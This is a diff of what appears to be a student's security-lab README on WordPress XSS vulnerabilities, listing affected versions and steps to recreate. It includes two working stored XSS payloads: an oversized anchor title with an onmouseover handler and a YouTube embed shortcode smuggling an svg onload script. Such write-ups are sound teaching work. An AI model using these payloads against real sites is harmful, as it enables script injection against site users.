@@ -18,21 +18,22 @@ Time spent: **20** hours spent in total
   - [ ] Steps to recreate: Autheticated user must comment <a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px AAA...[64KB]...AAA></a> to successfully plan the vulnerability.
   - [ ] Affected source code:
     
-    
+(Required) 4.0-4.7.2 - Authenticated Stored Cross-Site Scripting (XSS) in YouTube URL Embeds
 2. (Required) XSS
   - [ ] Summary: YouTube embedded
     - Vulnerability types: XSS
     - Tested in version: 4.2
     - Fixed in version: 4.2.1
-  - [ ] GIF Walkthrough: 
-  - [ ] Steps to recreate: 
+  - [ ] GIF Walkthrough: <img src='2.gif' width=800>
+  - [ ] Steps to recreate: Autheticated user must comment [embed src='https://youtube.com/embed/12345\x3csvg onload=alert("hgiytfiyt")\x3e'][/embed] to successfully plan the vulnerability
   - [ ] Affected source code:
-  
+
+
   3. (Required) XSS
   - [ ] Summary: 
     - Vulnerability types: XSS
-    - Tested in version: 4.2
-    - Fixed in version: 4.2.1
+    - Tested in version: 4.7.2
+    - Fixed in version: 4.7.3
   - [ ] GIF Walkthrough: 
   - [ ] Steps to recreate: 
   - [ ] Affected source code:
